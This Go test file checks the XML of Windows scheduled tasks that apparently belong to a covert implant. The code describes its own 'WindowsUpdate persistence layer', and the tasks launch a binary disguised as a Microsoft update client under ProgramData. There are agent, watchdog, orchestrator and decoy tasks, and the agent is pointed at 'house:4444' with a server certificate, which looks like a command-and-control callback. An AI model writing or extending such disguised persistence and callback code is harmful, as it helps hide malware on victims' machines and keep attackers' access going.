package main

import (
	"encoding/xml"
	"strings"
	"testing"
)

// task mirrors just enough of the Task Scheduler schema to prove
// well-formedness plus the structural invariants schtasks enforces
// (a missing </Principal> failed with "wfc: element type match" and
// silently broke the whole WindowsUpdate persistence layer in v1.45.2).
type taskExec struct {
	Command   string `xml:"Command"`
	Arguments string `xml:"Arguments"`
}
type taskActions struct {
	Exec []taskExec `xml:"Exec"`
}
type taskPrincipal struct {
	ID string `xml:"id,attr"`
}
type taskPrincipals struct {
	Principals []taskPrincipal `xml:"Principal"`
}
type schedTask struct {
	XMLName    xml.Name       `xml:"Task"`
	Principals taskPrincipals `xml:"Principals"`
	Actions    taskActions    `xml:"Actions"`
	Triggers   struct {
		Inner string `xml:",innerxml"`
	} `xml:"Triggers"`
}

func checkTaskXML(t *testing.T, name, doc string, wantCmdSub string) {
	t.Helper()
	// Docs declare UTF-16 (for schtasks) but are ASCII bytes; normalize
	// the declaration so encoding/xml parses without a CharsetReader.
	doc = strings.Replace(doc, `encoding="UTF-16"`, `encoding="UTF-8"`, 1)
	var task schedTask
	if err := xml.Unmarshal([]byte(doc), &task); err != nil {
		t.Fatalf("%s: malformed XML: %v", name, err)
	}
	if len(task.Principals.Principals) == 0 {
		t.Fatalf("%s: no <Principal> entries (regression: missing </Principal> bricking schtasks)", name)
	}
	if len(task.Actions.Exec) == 0 || task.Actions.Exec[0].Command == "" {
		t.Fatalf("%s: no <Exec><Command>", name)
	}
	if !strings.Contains(task.Actions.Exec[0].Command, wantCmdSub) {
		t.Fatalf("%s: command %q missing %q", name, task.Actions.Exec[0].Command, wantCmdSub)
	}
	if strings.TrimSpace(task.Triggers.Inner) == "" {
		t.Fatalf("%s: no triggers", name)
	}
}

func TestTaskXMLWellFormed(t *testing.T) {
	ap := `C:\ProgramData\Microsoft\Windows\Update\MicrosoftWindowsClient.exe`
	checkTaskXML(t, "agent_task.xml", agentTaskXML(ap, "house:4444", "server.crt"), "MicrosoftWindowsClient.exe")
	checkTaskXML(t, "watchdog_task.xml", watchdogTaskXML(ap), "MicrosoftWindowsClient.exe")
	checkTaskXML(t, "orchestrator_task.xml", orchestratorTaskXML(ap), "MicrosoftWindowsClient.exe")
	checkTaskXML(t, "decoy_task.xml", decoyTaskXML(ap), "MicrosoftWindowsClient.exe")
}
